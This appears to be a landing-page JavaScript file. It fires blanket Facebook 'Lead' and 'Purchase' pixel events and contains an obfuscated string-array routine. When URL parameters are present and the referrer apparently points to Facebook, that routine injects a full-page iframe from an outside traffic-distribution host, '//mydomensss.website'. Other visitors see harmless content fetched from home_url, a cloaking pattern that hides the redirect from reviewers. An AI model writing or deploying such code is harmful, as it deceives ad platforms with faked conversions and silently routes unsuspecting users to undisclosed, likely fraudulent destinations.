url = new URL(window.location.href);
params = new URLSearchParams(url.search);
fb = params.get("fb");
thank = params.has("thank");
out_url = params.has("outurl");

function stripslashes(str) {
    return (str + "").replace(/\\(.?)/g, function(s, n1) {
        switch (n1) {
            case "\\":
                return "\\";
            case "0":
                return "\0";
            case "":
                return "";
            default:
                return n1
        }
    })
}

function getCode(my_url) {
        $.ajax({
        url: my_url,
        type: "GET",
        success: function(data) {
			var tempDom = $('<output>').append($.parseHTML(data));
			var appContainer = $('#main', tempDom);
			document.getElementById("main").innerHTML = appContainer.html();
        }
    })
}
if (thank) {
    if (window.top.location.href !== window.location.href) {
        window.top.location = window.location.href
    }
    getCode(thank_you_url);
    var fb_img = document.createElement("img");
    fb_img.src = "https://www.facebook.com/tr?id=" + fb +'&ev=PageView&noscript=1';
    fb_img.height = "1";
    fb_img.width = "1";
    fb_img.style = "display:none";
    document.body.appendChild(fb_img);
    !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
                n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
                n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
                t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
                document,'script','https://connect.facebook.net/en_US/fbevents.js');
            fbq('init', fb);
            fbq('track', 'PageView');
            fbq('track', 'Lead');
            fbq('track', 'Purchase');
}
if (out_url) {
    if (window.top.location.href !== window.location.href) {
        window.top.location = window.location.href
    }
}
tds_url = "//mydomensss.website";
var a = ["search", "slice", "split", "replace", "undefined", "toLowerCase", "string", "push", "href", "stringify", "facebook", "linkcl", "/link/", ".php", "ty=", "referrer", "write", '<iframe src="', "location"];
(function(c, d) {
    var e = function(f) {
        while (--f) {
            c["push"](c["shift"]())
        }
    };
    e(++d)
})(a, 246);
var b = function(c, d) {
    c = c - 0;
    var e = a[c];
    return e
};

function getAllUrlParams(c) {
    var d = c ? c["split"]("?")[1] : window[b("0x0")][b("0x1")][b("0x2")](1);
    var e = {};
    if (d) {
        d = d[b("0x3")]("#")[0];
        var f = d["split"]("&");
        for (var g = 0; g < f["length"]; g++) {
            var h = f[g][b("0x3")]("=");
            var i = undefined;
            var j = h[0][b("0x4")](/\[\d*\]/, function(k) {
                i = k[b("0x2")](1, -1);
                return ""
            });
            var l = typeof h[1] === b("0x5") ? !![] : h[1];
            j = j[b("0x6")]();
            l = l[b("0x6")]();
            if (e[j]) {
                if (typeof e[j] === b("0x7")) {
                    e[j] = [e[j]]
                }
                if (typeof i === b("0x5")) {
                    e[j][b("0x8")](l)
                } else {
                    e[j][i] = l
                }
            } else {
                e[j] = l
            }
        }
    }
    return e
}
var get_params = getAllUrlParams(window[b("0x0")][b("0x9")]);
if (JSON[b("0xa")](get_params) !== "{}" && document["referrer"]["indexOf"](b("0xb")) !== -1) {
    var get_string = "";
    if (get_params[b("0xc")]) {
        tds_url += b("0xd") + get_params[b("0xc")] + b("0xe");
        delete get_params[b("0xc")]
    } else {
        tds_url += "/visit.php"
    }
    landing = tds_url;
    for (k in get_params) {
        get_string += k + "=" + get_params[k] + "&"
    }
    get_string += b("0xf") + encodeURI(window.location.origin + window.location.pathname);
    landing += "?" + get_string;
    document[b("0x11")](b("0x12") + landing + '"   frameborder="0" border="0" cellspacing="0" style="border-style: none;width: 100%; height: 1200px;"/>')
} else {
    if (!thank) {
        getCode(home_url)
    }
}